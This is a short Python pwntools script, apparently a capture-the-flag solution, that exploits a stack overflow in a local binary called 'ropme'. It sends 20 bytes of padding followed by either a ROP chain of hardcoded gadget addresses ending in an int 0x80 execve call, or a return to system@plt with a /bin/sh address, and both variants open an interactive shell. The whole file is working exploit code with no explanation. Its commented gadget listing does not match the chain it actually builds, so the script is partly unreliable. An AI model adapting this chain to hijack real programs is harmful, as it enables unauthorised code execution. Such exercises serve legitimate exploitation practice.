#!/usr/bin/env python2
from pwn import *

global p
p = process("./ropme")

#######################
''' Shellcode Style '''
#######################

binsh = 0x0804a024

pop_ebx = 0x0804832d
xor_ecx = 0x080484b5
xor_edx = 0x080484b8
syscall = 0x080484bb

'''
    pop ebx
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''

exploit = "A" * 20
exploit += p32(pop_ebx)
exploit += p32(binsh)
exploit += p32(xor_ecx)
exploit += p32(xor_edx)
exploit += p32(syscall)

p.sendlineafter("It's time to ROP!\n",exploit)
p.interactive()


##################
''' system plt '''
##################

system_plt = 0x080484e3
binsh = 0x0804a024

exploit = "A" * 20
exploit += p32(system_plt)
exploit += p32(binsh)

p.sendlineafter("It's time to ROP!\n",exploit)
p.interactive()